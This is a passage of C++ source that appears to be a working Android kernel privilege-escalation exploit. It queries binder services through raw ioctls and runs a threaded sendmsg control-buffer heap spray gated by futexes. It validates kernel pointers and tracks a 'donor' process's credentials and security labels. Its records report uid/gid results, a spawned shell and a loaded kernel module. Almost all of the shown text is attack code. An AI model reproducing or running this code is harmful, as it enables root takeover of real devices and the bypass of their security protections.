             offset + sizeof(std::uint32_t) <= request.read_consumed;) {
            std::uint32_t response = 0;
            std::memcpy(&response, read_buffer + offset, sizeof(response));
            offset += sizeof(response);
            std::size_t payload_size = _IOC_SIZE(response);
            if (offset + payload_size > request.read_consumed) {
                return {};
            }
            if (response == BR_REPLY &&
                payload_size >= sizeof(binder_transaction_data)) {
                binder_transaction_data reply {};
                std::memcpy(&reply, read_buffer + offset, sizeof(reply));
                const auto* data = reinterpret_cast<const std::uint8_t*>(
                        reply.data.ptr.buffer);
                std::int32_t length = 0;
                if (reply.data_size >= sizeof(length)) {
                    std::memcpy(&length, data, sizeof(length));
                }
                std::string descriptor;
                if (length > 0 &&
                    static_cast<std::size_t>(length * 2 + 4) <=
                            reply.data_size) {
                    for (std::int32_t index = 0; index < length; ++index) {
                        char16_t character = 0;
                        std::memcpy(&character, data + 4 + index * 2,
                                    sizeof(character));
                        if (character > 0x7f) {
                            descriptor.clear();
                            break;
                        }
                        descriptor += static_cast<char>(character);
                    }
                }
                free_buffer(fd, reply.data.ptr.buffer);
                return descriptor;
            }
            if (response == BR_DEAD_REPLY || response == BR_FAILED_REPLY) {
                return {};
            }
            offset += payload_size;
        }
    }
    return {};
}

bool handle_rejected_with_failed_reply(int fd, int handle) {
    binder_transaction_data transaction {};
    transaction.target.handle = static_cast<std::uint32_t>(handle);
    transaction.code = kInterfaceQuery;
    std::uint8_t write_buffer[sizeof(std::uint32_t) + sizeof(transaction)] {};
    write_command(write_buffer, BC_TRANSACTION, &transaction,
                  sizeof(transaction));
    bool written = false;
    for (int attempt = 0; attempt < 16; ++attempt) {
        std::uint8_t read_buffer[4096] {};
        binder_write_read request {};
        request.write_size = written ? 0 : sizeof(write_buffer);
        request.write_buffer = reinterpret_cast<binder_uintptr_t>(
                written ? nullptr : write_buffer);
        request.read_size = sizeof(read_buffer);
        request.read_buffer = reinterpret_cast<binder_uintptr_t>(
                read_buffer);
        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0 ||
            (!written && request.write_consumed != sizeof(write_buffer))) {
            return false;
        }
        written = true;
        for (std::size_t offset = 0;
             offset + sizeof(std::uint32_t) <= request.read_consumed;) {
            std::uint32_t response = 0;
            std::memcpy(&response, read_buffer + offset, sizeof(response));
            offset += sizeof(response);
            std::size_t payload_size = _IOC_SIZE(response);
            if (offset + payload_size > request.read_consumed) {
                return false;
            }
            if (response == BR_FAILED_REPLY) {
                return true;
            }
            if (response == BR_DEAD_REPLY || response == BR_REPLY) {
                return false;
            }
            offset += payload_size;
        }
    }
    return false;
}

int locate_owner(int fd) {
    for (int handle = 1; handle <= 512; ++handle) {
        if (query_descriptor(fd, handle) == kOwnerDescriptor) {
            return handle;
        }
    }
    for (int handle = 1; handle <= 512; ++handle) {
        if (query_descriptor(fd, handle) == kOwner2Descriptor) {
            return handle;
        }
    }
    return -1;
}

int locate_descriptor(int fd, const char* descriptor, int limit) {
    for (int handle = 1; handle <= limit; ++handle) {
        if (query_descriptor(fd, handle) == descriptor) {
            return handle;
        }
    }
    return -1;
}

bool write_text_file(const std::string& path, const std::string& value) {
    std::string temporary = path + ".tmp";
    int fd = open(temporary.c_str(),
            O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
    if (fd < 0) {
        return false;
    }
    bool written = write(fd, value.data(), value.size()) ==
            static_cast<ssize_t>(value.size());
    if (written) {
        written = fsync(fd) == 0;
    }
    close(fd);
    if (!written || rename(temporary.c_str(), path.c_str()) != 0) {
        unlink(temporary.c_str());
        return false;
    }
    return true;
}

void record_raw_unlink_stage(int fd, const char* format, ...) {
    if (fd < 0) {
        return;
    }
    char state[256];
    va_list arguments;
    va_start(arguments, format);
    int length = std::vsnprintf(state, sizeof(state), format, arguments);
    va_end(arguments);
    if (length < 0) {
        return;
    }
    std::size_t size = std::min(
            static_cast<std::size_t>(length), sizeof(state) - 1);
    if (size < sizeof(state) - 1) {
        state[size++] = '\n';
    }
    if (ftruncate(fd, 0) != 0 || lseek(fd, 0, SEEK_SET) < 0) {
        return;
    }
    ssize_t written = write(fd, state, size);
    if (written == static_cast<ssize_t>(size)) {
        fsync(fd);
    }
}

std::string read_text_file(const std::string& path) {
    std::string value;
    int fd = open(path.c_str(), O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        return value;
    }
    constexpr std::size_t kMaximumRecordSize = 16 * 1024;
    char buffer[512];
    bool valid = true;
    for (;;) {
        ssize_t count = read(fd, buffer, sizeof(buffer));
        if (count == 0) {
            break;
        }
        if (count < 0) {
            if (errno == EINTR) {
                continue;
            }
            valid = false;
            break;
        }
        if (value.size() + static_cast<std::size_t>(count) >
            kMaximumRecordSize) {
            valid = false;
            break;
        }
        value.append(buffer, static_cast<std::size_t>(count));
    }
    close(fd);
    if (!valid) {
        value.clear();
    }
    return value;
}

bool parse_ordered_record(
        const std::string& value,
        const std::vector<const char*>& names,
        std::map<std::string, std::string>* fields) {
    fields->clear();
    std::size_t record_size = value.size();
    if (record_size > 0 && value[record_size - 1] == '\n') {
        --record_size;
        if (record_size > 0 && value[record_size - 1] == '\r') {
            --record_size;
        }
    }
    std::string record = value.substr(0, record_size);
    std::size_t cursor = 0;
    for (std::size_t index = 0; index < names.size(); ++index) {
        if (index > 0) {
            if (cursor >= record.size() || record[cursor] != ' ') {
                return false;
            }
            ++cursor;
        }
        std::string prefix = std::string(names[index]) + "=";
        if (record.compare(cursor, prefix.size(), prefix) != 0) {
            return false;
        }
        cursor += prefix.size();
        std::size_t end = record.find(' ', cursor);
        if (end == std::string::npos) {
            end = record.size();
        }
        if (end == cursor) {
            return false;
        }
        fields->emplace(names[index], record.substr(cursor, end - cursor));
        cursor = end;
    }
    return cursor == record.size() && fields->size() == names.size();
}

bool decimal_digits(const std::string& value) {
    return !value.empty() && std::all_of(
            value.begin(), value.end(), [](unsigned char character) {
                return character >= '0' && character <= '9';
            });
}

bool lower_hex_digits(const std::string& value) {
    return !value.empty() && std::all_of(
            value.begin(), value.end(), [](unsigned char character) {
                return (character >= '0' && character <= '9') ||
                        (character >= 'a' && character <= 'f');
            });
}

struct TerminalCommandWatchdogProof {
    bool phase_normalised = false;
    std::string nonce;
    std::string boot_id;
    int watchdog_tid = -1;
    int joined = 0;
    int tid_gone = 0;
    int uid_result = -1;
    int gid_result = -1;
    int shell = 0;
    int ctlbuf_repaired = 0;
    int module_loaded = 0;
    int module_unloaded = 0;
    int module_finalised = 0;
    int finalise_proof = 0;
    int donor_frozen = 0;
    int donor_resumed = 0;
    int donor_resume_pid = -1;
    int donor_resume_result = -1;
    int donor_resume_errno = -1;
    CtlbufDonorResumeRecord resume_record {};
    int host_donor_pid = -1;
    std::string host_donor_start_time;
    std::string host_donor_tids;
    std::string host_donor_states;
    int host_donor_samples = 0;
    bool helper_retired = false;
};

bool parse_int_field(const std::string& value, int* result) {
    if (value.empty()) {
        return false;
    }
    char* end = nullptr;
    errno = 0;
    long parsed = std::strtol(value.c_str(), &end, 10);
    if (errno != 0 || end == value.c_str() || *end != '\0' ||
        parsed < INT_MIN || parsed > INT_MAX) {
        return false;
    }
    *result = static_cast<int>(parsed);
    return true;
}

bool parse_unsigned_long_field(const std::string& value,
                               std::uint64_t* result) {
    if (value.empty() || result == nullptr) {
        return false;
    }
    char* end = nullptr;
    errno = 0;
    unsigned long long parsed = std::strtoull(value.c_str(), &end, 0);
    if (errno != 0 || end == value.c_str() || *end != '\0') {
        return false;
    }
    *result = static_cast<std::uint64_t>(parsed);
    return true;
}

bool kernel_pointer(std::uint64_t value);

TerminalCommandWatchdogProof read_terminal_command_watchdog_proof(
        const std::string& directory, int helper_pid) {
    TerminalCommandWatchdogProof proof;
    std::map<std::string, std::string> normalised;
    std::map<std::string, std::string> retired;
    const std::vector<const char*> native_names = {
            "watchdog_tid", "joined", "tid_gone", "uid_result",
            "gid_result", "shell", "ctlbuf_repaired", "module_loaded",
            "module_unloaded", "module_finalised", "finalise_proof",
            "donor_frozen", "donor_resumed", "donor_resume_pid",
            "donor_resume_result", "donor_resume_errno",
    };
    const std::vector<const char*> resume_names = {
            "resume_magic", "resume_version", "resume_size",
            "resume_cookie_hi", "resume_cookie_lo", "resume_helper_task",
            "resume_helper_pid", "resume_donor_task", "resume_donor_tgid",
            "resume_signal",
            "resume_before_state", "resume_before_exit_state",
            "resume_before_threads", "resume_before_stopped",
            "resume_after_state", "resume_after_exit_state",
            "resume_after_threads", "resume_after_stopped",
            "resume_stable_samples", "resume_task_security",
            "resume_task_security_word8", "resume_inode_security",
            "resume_inode_security_word8", "resume_labels_restored",
            "resume_resumed", "resume_proof", "resume_commit",
            "host_donor_pid", "host_donor_start_time", "host_donor_tids",
            "host_donor_states", "host_donor_samples",
    };
    std::vector<const char*> normalised_names = {
            "nonce", "helper_pid", "helper_start_time", "boot_id",
    };
    normalised_names.insert(normalised_names.end(), native_names.begin(),
                            native_names.end());
    normalised_names.insert(normalised_names.end(), resume_names.begin(),
                            resume_names.end());
    normalised_names.push_back("host_helper_identity");
    std::vector<const char*> retired_names = normalised_names;
    retired_names.insert(retired_names.end() - 1, "helper_retired");
    bool normalised_valid = parse_ordered_record(
            read_text_file(directory + "/helper-normalised.done"),
            normalised_names,
            &normalised);
    bool retired_valid = parse_ordered_record(
            read_text_file(directory + "/helper-retired.done"),
            retired_names,
            &retired);
    std::string boot_id = read_text_file(
            "/proc/sys/kernel/random/boot_id");
    while (!boot_id.empty() &&
           (boot_id.back() == '\n' || boot_id.back() == '\r')) {
        boot_id.pop_back();
    }
    bool metadata = normalised_valid && retired_valid && helper_pid > 0 &&
            normalised["nonce"].size() == 32 &&
            lower_hex_digits(normalised["nonce"]) &&
            normalised["nonce"] == retired["nonce"] &&
            decimal_digits(normalised["helper_pid"]) &&
            std::atoi(normalised["helper_pid"].c_str()) == helper_pid &&
            normalised["helper_pid"] == retired["helper_pid"] &&
            decimal_digits(normalised["helper_start_time"]) &&
            normalised["helper_start_time"] ==
                    retired["helper_start_time"] &&
            !boot_id.empty() && normalised["boot_id"] == boot_id &&
            normalised["boot_id"] == retired["boot_id"] &&
            normalised["host_helper_identity"] == "1" &&
            retired["host_helper_identity"] == "1";
    bool exact_native_record = metadata;
    for (const char* name : native_names) {
        exact_native_record = exact_native_record &&
                normalised[name] == retired[name];
    }
    for (const char* name : resume_names) {
        exact_native_record = exact_native_record &&
                normalised[name] == retired[name];
    }
    auto parse_u64 = [&](const char* name, std::uint64_t* target) {
        return parse_unsigned_long_field(normalised[name], target);
    };
    auto parse_u32 = [&](const char* name, std::uint32_t* target) {
        std::uint64_t value = 0;
        bool valid = parse_unsigned_long_field(normalised[name], &value) &&
                value <= UINT32_MAX;
        if (valid) {
            *target = static_cast<std::uint32_t>(value);
        }
        return valid;
    };
    auto parse_s32 = [&](const char* name, std::int32_t* target) {
        int value = 0;
        bool valid = parse_int_field(normalised[name], &value);
        if (valid) {
            *target = value;
        }
        return valid;
    };
    auto& resume = proof.resume_record;
    bool resume_fields =
            parse_u64("resume_magic", &resume.magic) &&
            parse_u32("resume_version", &resume.version) &&
            parse_u32("resume_size", &resume.size) &&
            parse_u64("resume_cookie_hi", &resume.cookie_hi) &&
            parse_u64("resume_cookie_lo", &resume.cookie_lo) &&
            parse_u64("resume_helper_task", &resume.helper_task) &&
            parse_s32("resume_helper_pid", &resume.helper_pid) &&
            parse_u64("resume_donor_task", &resume.donor_task) &&
            parse_s32("donor_resume_pid", &resume.donor_pid) &&
            parse_s32("resume_donor_tgid", &resume.donor_tgid) &&
            parse_s32("resume_signal", &resume.signal) &&
            parse_s32("donor_resume_result", &resume.signal_rc) &&
            parse_s32("donor_resume_errno", &resume.signal_errno) &&
            parse_u64("resume_before_state", &resume.pre_state) &&
            parse_u64("resume_before_exit_state", &resume.pre_exit_state) &&
            parse_u32("resume_before_threads", &resume.pre_thread_count) &&
            parse_u32("resume_before_stopped", &resume.pre_stopped_count) &&
            parse_u64("resume_after_state", &resume.post_state) &&
            parse_u64("resume_after_exit_state", &resume.post_exit_state) &&
            parse_u32("resume_after_threads", &resume.post_thread_count) &&
            parse_u32("resume_after_stopped", &resume.post_stopped_count) &&
            parse_u32("resume_stable_samples", &resume.stable_samples) &&
            parse_u64("resume_task_security", &resume.task_security) &&
            parse_u64("resume_task_security_word8",
                      &resume.task_security_word8) &&
            parse_u64("resume_inode_security", &resume.inode_security) &&
            parse_u64("resume_inode_security_word8",
                      &resume.inode_security_word8) &&
            parse_u32("resume_labels_restored", &resume.labels_restored) &&
            parse_u32("resume_resumed", &resume.resumed) &&
            parse_u32("resume_proof", &resume.proof) &&
            parse_u64("resume_commit", &resume.commit);
    std::uint64_t nonce_hi = 0;
    std::uint64_t nonce_lo = 0;
    bool nonce_cookies = metadata && parse_unsigned_long_field(
            "0x" + normalised["nonce"].substr(0, 16), &nonce_hi) &&
            parse_unsigned_long_field(
                    "0x" + normalised["nonce"].substr(16), &nonce_lo);
    int host_donor_pid = -1;
    int host_donor_samples = 0;
    bool host_fields = parse_int_field(
            normalised["host_donor_pid"], &host_donor_pid) &&
            parse_int_field(normalised["host_donor_samples"],
                            &host_donor_samples) &&
            decimal_digits(normalised["host_donor_start_time"]) &&
            !normalised["host_donor_tids"].empty() &&
            !normalised["host_donor_states"].empty();
    std::uint64_t expected_commit = kCtlbufResumeMagic ^ nonce_hi ^ nonce_lo ^
            resume.donor_task ^ kCtlbufResumeCommitXor;
    bool exact_resume = resume_fields && nonce_cookies && host_fields &&
            resume.magic == kCtlbufResumeMagic &&
            resume.version == kCtlbufResumeVersion &&
            resume.size == sizeof(resume) && resume.cookie_hi == nonce_hi &&
            resume.cookie_lo == nonce_lo && resume.helper_pid == helper_pid &&
            kernel_pointer(resume.helper_task) &&
            kernel_pointer(resume.donor_task) &&
            resume.donor_pid == g_security_target_pid &&
            resume.donor_tgid == g_security_target_pid &&
            resume.signal == SIGCONT && resume.signal_rc == 0 &&
            resume.signal_errno == 0 && resume.pre_exit_state == 0 &&
            (resume.pre_state & 0xc) != 0 &&
            resume.pre_thread_count > 0 &&
            resume.pre_thread_count <= 4096 &&
            resume.pre_stopped_count == resume.pre_thread_count &&
            resume.post_exit_state == 0 && (resume.post_state & 0xc) == 0 &&
            resume.post_thread_count > 0 &&
            resume.post_thread_count <= 4096 &&
            resume.post_stopped_count == 0 && resume.stable_samples == 2 &&
            kernel_pointer(resume.task_security) &&
            resume.task_security_word8 == 0 &&
            kernel_pointer(resume.inode_security) &&
            resume.inode_security_word8 == 0 &&
            resume.labels_restored == 1 && resume.resumed == 1 &&
            resume.proof == 1 && resume.commit == expected_commit &&
            host_donor_pid == g_security_target_pid &&
            host_donor_samples == 2;
    proof.host_donor_start_time = normalised["host_donor_start_time"];
    proof.host_donor_pid = host_donor_pid;
    proof.host_donor_tids = normalised["host_donor_tids"];
    proof.host_donor_states = normalised["host_donor_states"];
    proof.host_donor_samples = host_donor_samples;
    proof.phase_normalised = exact_native_record && exact_resume &&
            parse_int_field(normalised["watchdog_tid"],
                            &proof.watchdog_tid) &&
            parse_int_field(normalised["joined"], &proof.joined) &&
            parse_int_field(normalised["tid_gone"], &proof.tid_gone) &&
            parse_int_field(normalised["uid_result"], &proof.uid_result) &&
            parse_int_field(normalised["gid_result"], &proof.gid_result) &&
            parse_int_field(normalised["shell"], &proof.shell) &&
            parse_int_field(normalised["ctlbuf_repaired"],
                            &proof.ctlbuf_repaired) &&
            parse_int_field(normalised["module_loaded"],
                            &proof.module_loaded) &&
            parse_int_field(normalised["module_unloaded"],
                            &proof.module_unloaded) &&
            parse_int_field(normalised["module_finalised"],
                            &proof.module_finalised) &&
            parse_int_field(normalised["finalise_proof"],
                            &proof.finalise_proof) &&
            parse_int_field(normalised["donor_frozen"],
                            &proof.donor_frozen) &&
            parse_int_field(normalised["donor_resumed"],
                            &proof.donor_resumed) &&
            parse_int_field(normalised["donor_resume_pid"],
                            &proof.donor_resume_pid) &&
            parse_int_field(normalised["donor_resume_result"],
                            &proof.donor_resume_result) &&
            parse_int_field(normalised["donor_resume_errno"],
                            &proof.donor_resume_errno) &&
            proof.ctlbuf_repaired == 1 && proof.module_loaded == 1 &&
            proof.module_unloaded == 1 && proof.module_finalised == 1 &&
            proof.finalise_proof == 1 && proof.donor_frozen == 1 &&
            proof.donor_resumed == 1 && proof.donor_resume_pid > 0 &&
            proof.donor_resume_result == 0 && proof.donor_resume_errno == 0 &&
            proof.donor_resume_pid == g_security_target_pid;
    proof.helper_retired = proof.phase_normalised &&
            retired["helper_retired"] == "1";
    if (metadata) {
        proof.nonce = normalised["nonce"];
        proof.boot_id = normalised["boot_id"];
    }
    return proof;
}

struct RawTargetRetirementProof {
    int pid = -1;
    int probe = 0;
    int probe_errno = 0;
    bool retired = false;
};

RawTargetRetirementProof read_raw_target_retirement_proof(
        const std::string& directory,
        const TerminalCommandWatchdogProof& watchdog) {
    RawTargetRetirementProof proof;
    std::map<std::string, std::string> fields;
    bool parsed = parse_ordered_record(
            read_text_file(directory + "/raw-target.retirement.result"),
            {"status", "stage", "nonce", "target_pid",
             "target_start_time", "boot_id", "self_exit"}, &fields);
    bool metadata = parsed && fields["status"] == "pass" &&
            fields["stage"] == "raw-target-retirement" &&
            !watchdog.nonce.empty() && fields["nonce"] == watchdog.nonce &&
            !watchdog.boot_id.empty() &&
            fields["boot_id"] == watchdog.boot_id &&
            decimal_digits(fields["target_start_time"]) &&
            fields["self_exit"] == "1" &&
            parse_int_field(fields["target_pid"], &proof.pid) &&
            proof.pid > 0;
    errno = 0;
    proof.probe = metadata ? kill(proof.pid, 0) : 0;
    proof.probe_errno = proof.probe == 0 ? 0 : errno;
    proof.retired = metadata && proof.probe == -1 &&
            proof.probe_errno == ESRCH;
    return proof;
}

struct OwnerRetirementProof {
    int pid = -1;
    int probe = 0;
    int probe_errno = 0;
    bool retired = false;
};

OwnerRetirementProof read_owner_retirement_proof(
        const std::string& directory,
        const TerminalCommandWatchdogProof& watchdog) {
    OwnerRetirementProof proof;
    std::map<std::string, std::string> fields;
    bool parsed = parse_ordered_record(
            read_text_file(
                    directory + "/owner-terminal-retirement.result"),
            {"status", "stage", "nonce", "owner_pid",
             "owner_start_time", "boot_id", "self_exit"}, &fields);
    bool metadata = parsed && fields["status"] == "pass" &&
            fields["stage"] == "owner-terminal-retirement" &&
            !watchdog.nonce.empty() && fields["nonce"] == watchdog.nonce &&
            !watchdog.boot_id.empty() &&
            fields["boot_id"] == watchdog.boot_id &&
            decimal_digits(fields["owner_start_time"]) &&
            fields["self_exit"] == "1" &&
            parse_int_field(fields["owner_pid"], &proof.pid) &&
            proof.pid > 0;
    errno = 0;
    proof.probe = metadata ? kill(proof.pid, 0) : 0;
    proof.probe_errno = proof.probe == 0 ? 0 : errno;
    proof.retired = metadata && proof.probe == -1 &&
            proof.probe_errno == ESRCH;
    return proof;
}

struct AnchorRetirementProof {
    int pid = -1;
    int probe = 0;
    int probe_errno = 0;
    bool retired = false;
};

AnchorRetirementProof read_anchor_retirement_proof(
        const std::string& directory,
        const TerminalCommandWatchdogProof& watchdog) {
    AnchorRetirementProof proof;
    std::map<std::string, std::string> fields;
    bool parsed = parse_ordered_record(
            read_text_file(directory + "/anchor-terminal-arm.result"),
            {"status", "stage", "nonce", "anchor_pid",
             "anchor_start_time", "boot_id", "armed"}, &fields);
    bool metadata = parsed && fields["status"] == "pass" &&
            fields["stage"] == "anchor-terminal-arm" &&
            !watchdog.nonce.empty() && fields["nonce"] == watchdog.nonce &&
            !watchdog.boot_id.empty() &&
            fields["boot_id"] == watchdog.boot_id &&
            decimal_digits(fields["anchor_start_time"]) &&
            fields["armed"] == "1" &&
            parse_int_field(fields["anchor_pid"], &proof.pid) &&
            proof.pid > 0;
    errno = 0;
    proof.probe = metadata ? kill(proof.pid, 0) : 0;
    proof.probe_errno = proof.probe == 0 ? 0 : errno;
    proof.retired = metadata && proof.probe == -1 &&
            proof.probe_errno == ESRCH;
    return proof;
}

bool wait_for_file(const std::string& path, int attempts) {
    for (int attempt = 0; attempt < attempts; ++attempt) {
        if (access(path.c_str(), F_OK) == 0) {
            return true;
        }
        usleep(10000);
    }
    return access(path.c_str(), F_OK) == 0;
}

bool wait_for_file_byte(const std::string& path, char expected,
                        int attempts) {
    int fd = open(path.c_str(), O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        return false;
    }
    bool matched = false;
    for (int attempt = 0; attempt < attempts; ++attempt) {
        char value = 0;
        if (pread(fd, &value, 1, 0) == 1 && value == expected) {
            matched = true;
            break;
        }
        usleep(10000);
    }
    close(fd);
    return matched;
}

bool kernel_pointer(std::uint64_t value) {
    return value >= UINT64_C(0xffffff8000000000) &&
            value < UINT64_C(0xffffffc000000000);
}

void reset_terminal_donor_proof_locked() {
    g_terminal_donor_proof = TerminalDonorRetirementProof{};
    g_terminal_donor_proof.sequence = g_terminal_sequence;
}

void reset_terminal_donor_proof() {
    std::lock_guard<std::mutex> lock(g_terminal_donor_proof_mutex);
    reset_terminal_donor_proof_locked();
}

void begin_terminal_sequence() {
    std::lock_guard<std::mutex> lock(g_terminal_donor_proof_mutex);
    ++g_terminal_sequence;
    if (g_terminal_sequence == 0) {
        ++g_terminal_sequence;
    }
    reset_terminal_donor_proof_locked();
}

bool terminal_donor_proof_fields_valid_locked(
        const TerminalDonorRetirementProof& proof) {
    return proof.valid && !proof.consumed &&
            proof.sequence != 0 && proof.sequence == g_terminal_sequence &&
            g_direct_terminal_cleanup &&
            proof.helper_retired && proof.credential_target_death &&
            proof.donor_slots && proof.donor_baseline &&
            proof.donor_refs_retired && proof.donor_repair == 0 &&
            proof.complete_samples == 2 &&
            proof.donor_task == g_terminal_donor_task &&
            proof.donor_cred == g_security_target_cred &&
            proof.donor_real_cred_slot == g_terminal_donor_real_cred_slot &&
            proof.donor_cred_slot == g_terminal_donor_cred_slot &&
            proof.donor_real_cred == g_security_target_cred &&
            proof.donor_cred_value == g_security_target_cred &&
            proof.baseline_usage == g_terminal_donor_usage &&
            proof.observed_usage == g_terminal_donor_usage &&
            proof.preexit_refs_valid &&
            proof.preexit_usage == g_terminal_donor_usage + 2U &&
            g_ctlbuf_finalise_verified;
}

TerminalDonorRetirementProof consume_terminal_donor_proof() {
    std::lock_guard<std::mutex> lock(g_terminal_donor_proof_mutex);
    TerminalDonorRetirementProof proof;
    if (!terminal_donor_proof_fields_valid_locked(
                g_terminal_donor_proof)) {
        return proof;
    }
    proof = g_terminal_donor_proof;
    g_terminal_donor_proof.consumed = true;
    proof.consumed = true;
    return proof;
}

bool kernel_address(std::uint64_t value) {
    return value >= UINT64_C(0xffffff8000000000);
}

bool send_code(int fd, int handle, std::uint32_t code, bool oneway) {
    binder_transaction_data transaction {};
    transaction.target.handle = static_cast<std::uint32_t>(handle);
    transaction.code = code;
    transaction.flags = oneway ? TF_ONE_WAY : 0;
    std::uint8_t command[sizeof(std::uint32_t) + sizeof(transaction)] {};
    write_command(command, BC_TRANSACTION, &transaction,
                  sizeof(transaction));
    return write_binder_commands(fd, command, sizeof(command)) == 0;
}

void* run_fake_control_sender(void* argument) {
    auto* slot = static_cast<FakeControlSlot*>(argument);
    slot->tid = static_cast<pid_t>(syscall(SYS_gettid));
    if (slot->tid <= 0 ||
        prctl(PR_SET_NAME, "lp3-fake-ctl", 0, 0, 0) != 0) {
        slot->saved_errno = errno;
        slot->state.store(3, std::memory_order_release);
        return nullptr;
    }
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(2, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        slot->saved_errno = errno;
        slot->state.store(3, std::memory_order_release);
        return nullptr;
    }
    slot->state.store(1, std::memory_order_release);
    if (slot->staged.load(std::memory_order_acquire)) {
        while (g_fake_control_staged_gate.load(
                       std::memory_order_acquire) !=
                slot->staged_generation) {
            int expected = g_fake_control_staged_gate.load(
                    std::memory_order_acquire);
            syscall(SYS_futex, &g_fake_control_staged_gate,
                    FUTEX_WAIT_PRIVATE, expected,
                    nullptr, nullptr, 0);
        }
    } else {
        while (g_fake_control_gate.load(std::memory_order_acquire) == 0) {
            syscall(SYS_futex, &g_fake_control_gate, FUTEX_WAIT_PRIVATE, 0,
                    nullptr, nullptr, 0);
        }
    }

    iovec vector {};
    vector.iov_base = slot->payload;
    vector.iov_len = sizeof(slot->payload);
    msghdr message {};
    message.msg_iov = &vector;
    message.msg_iovlen = 1;
    message.msg_control = slot->payload;
    message.msg_controllen = sizeof(slot->payload);
    slot->state.store(2, std::memory_order_release);
    errno = 0;
    slot->result = static_cast<int>(syscall(
            SYS_sendmsg, slot->pair[0], &message, 0));
    slot->saved_errno = errno;
    if (slot->rearm_requested.load(std::memory_order_acquire)) {
        iovec rearm_vector {};
        rearm_vector.iov_base = slot->rearm_payload;
        rearm_vector.iov_len = sizeof(slot->rearm_payload);
        msghdr rearm_message {};
        rearm_message.msg_iov = &rearm_vector;
        rearm_message.msg_iovlen = 1;
        rearm_message.msg_control = slot->rearm_payload;
        rearm_message.msg_controllen = sizeof(slot->rearm_payload);
        slot->state.store(4, std::memory_order_release);
        errno = 0;
        slot->rearm_result = static_cast<int>(syscall(
                SYS_sendmsg, slot->rearm_pair[0], &rearm_message, 0));
        slot->rearm_errno = errno;
        slot->state.store(5, std::memory_order_release);
    } else {
        slot->state.store(3, std::memory_order_release);
    }
    return nullptr;
}

bool close_owned_fd(int fd) {
    errno = 0;
    return close(fd) == 0;
}

bool fake_control_slot_active_staged(const FakeControlSlot& slot) {
    return slot.staged.load(std::memory_order_acquire) &&
            !slot.poisoned && slot.created;
}

void wake_fake_control_staged_waiters_locked() {
    bool has_waiters = false;
    for (const auto& slot : g_fake_control_slots) {
        if (slot.created && slot.staged.load(std::memory_order_acquire)) {
            has_waiters = true;
            break;
        }
    }
    if (!has_waiters || g_fake_control_staged_generation == 0) {
        return;
    }
    g_fake_control_staged_gate.store(g_fake_control_staged_generation,
                                     std::memory_order_release);
    syscall(SYS_futex, &g_fake_control_staged_gate, FUTEX_WAKE_PRIVATE,
            INT_MAX, nullptr, nullptr, 0);
}

int release_fake_control_spray_locked() {
    if (!g_fake_control_active) {
        return 0;
    }
    wake_fake_control_staged_waiters_locked();
    g_fake_control_gate.store(1, std::memory_order_release);
    syscall(SYS_futex, &g_fake_control_gate, FUTEX_WAKE_PRIVATE, INT_MAX,
            nullptr, nullptr, 0);
    bool close_valid = true;
    for (auto& slot : g_fake_control_slots) {
        if (slot.poisoned) {
            continue;
        }
        if (slot.pair[1] >= 0) {
            shutdown(slot.pair[1], SHUT_RDWR);
            bool closed = close_owned_fd(slot.pair[1]);
            close_valid = closed && close_valid;
            if (closed) {
                slot.pair[1] = -1;
            }
        }
        if (slot.rearm_pair[1] >= 0) {
            shutdown(slot.rearm_pair[1], SHUT_RDWR);
            bool closed = close_owned_fd(slot.rearm_pair[1]);
            close_valid = closed && close_valid;
            if (closed) {
                slot.rearm_pair[1] = -1;
            }
        }
    }
    int joined = 0;
    for (auto& slot : g_fake_control_slots) {
        if (slot.poisoned) {
            continue;
        }
        if (slot.created) {
            pthread_join(slot.thread, nullptr);
            slot.created = false;
            ++joined;
        }
        if (slot.pair[0] >= 0) {
            bool closed = close_owned_fd(slot.pair[0]);
            close_valid = closed && close_valid;
            if (closed) {
                slot.pair[0] = -1;
            }
        }
        if (slot.rearm_pair[0] >= 0) {
            bool closed = close_owned_fd(slot.rearm_pair[0]);
            close_valid = closed && close_valid;
            if (closed) {
                slot.rearm_pair[0] = -1;
            }
        }
        if (slot.pair[0] < 0 && slot.pair[1] < 0 &&
            slot.rearm_pair[0] < 0 && slot.rearm_pair[1] < 0) {
            slot.staged.store(false, std::memory_order_relaxed);
            slot.staged_generation = 0;
            slot.rearm_requested.store(false, std::memory_order_relaxed);
            slot.activation.store(0, std::memory_order_relaxed);
            slot.poison_victim = -1;
            slot.tid = -1;
            slot.state.store(0, std::memory_order_relaxed);
        }
    }
    if (close_valid) {
        g_fake_control_active = false;
        g_fake_control_expected = 0;
        g_fake_control_staged_limit = 0;
        g_fake_control_staged_expected = 0;
        g_fake_control_gate.store(0, std::memory_order_relaxed);
        g_fake_control_staged_gate.store(0, std::memory_order_relaxed);
    }
    return close_valid ? joined : -1;
}

int release_fake_control_spray() {
    std::lock_guard<std::mutex> lock(g_fake_control_mutex);
    return release_fake_control_spray_locked();
}

bool close_rearmed_fake_control_slot_locked(FakeControlSlot* slot,
                                             bool clear_poison) {
    if (slot == nullptr || !slot->poisoned || !slot->created ||
        !slot->rearm_requested.load(std::memory_order_acquire) ||
        slot->pair[0] < 0 || slot->rearm_pair[0] < 0 ||
        slot->rearm_pair[1] < 0 ||
        slot->state.load(std::memory_order_acquire) != 4) {
        return false;
    }
    usleep(5000);
    if (slot->state.load(std::memory_order_acquire) != 4) {
        return false;
    }
    shutdown(slot->rearm_pair[1], SHUT_RDWR);
    if (!close_owned_fd(slot->rearm_pair[1])) {
        return false;
    }
    slot->rearm_pair[1] = -1;
    bool finished = false;
    for (int attempt = 0; attempt < 2000; ++attempt) {
        if (slot->state.load(std::memory_order_acquire) == 5) {
            finished = true;
            break;
        }
        usleep(1000);
    }
    if (!finished || pthread_join(slot->thread, nullptr) != 0) {
        return false;
    }
    slot->created = false;
    if (!close_owned_fd(slot->pair[0])) {
        return false;
    }
    slot->pair[0] = -1;
    if (!close_owned_fd(slot->rearm_pair[0])) {
        return false;
    }
    slot->rearm_pair[0] = -1;
    if (slot->pair[1] >= 0) {
        shutdown(slot->pair[1], SHUT_RDWR);
        if (!close_owned_fd(slot->pair[1])) {
            return false;
        }
        slot->pair[1] = -1;
    }
    slot->staged.store(false, std::memory_order_relaxed);
    slot->staged_generation = 0;
    slot->rearm_requested.store(false, std::memory_order_relaxed);
